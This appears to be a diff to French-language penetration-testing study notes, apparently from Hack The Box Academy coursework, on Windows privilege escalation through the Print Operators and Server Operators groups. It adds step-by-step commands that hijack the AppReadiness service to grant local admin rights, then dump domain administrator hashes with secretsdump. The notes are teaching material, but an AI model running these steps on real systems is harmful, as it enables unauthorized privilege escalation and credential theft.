@@ -1,6 +1,6 @@
 ## Windows Groups Priv
 
-#Print Operators
+#Groupe Print Operators
 Controler les droits SeLoadDriverPrivilege
 --> Si non apparant, et pas de GUI bypass UAC
 	- https://github.com/hfiref0x/UACME
@@ -19,4 +19,21 @@ Exploiter avec ExploitCapcom.exe: https://github.com/tandasat/ExploitCapcom
 Si pas de GUI --> https://academy.hackthebox.com/module/67/section/605
 
 
-#Server Operators
+#Group Server Operators
+Controler AppReadiness 
+	--> sc qc AppReadiness
+Checker services permissions (PsService - Outil SysInternals) 
+	--> PsService.exe security AppReadiness
+Checker les droits local admin 
+	--> net localgroup Administrators
+Modifier les droits de l'utilisateur via AppReadiness 
+	-->sc config AppReadiness binPath= "cmd /c net localgroup Administrators <user_name> /add"
+Start AppReadiness (doit fail !!) 
+	--> sc start AppReadiness
+Confirmer le nouveau membership 
+	--> net localgroup Administrators 
+Confirmer les accès au DC 
+	--> crackmapexec smb <DC_IP> -u <user_name> -p <PASS>
+Récuperer les hashes 
+	--> secretsdump.py <user_name>@<dc_ip> -just-dc-user administrator
+
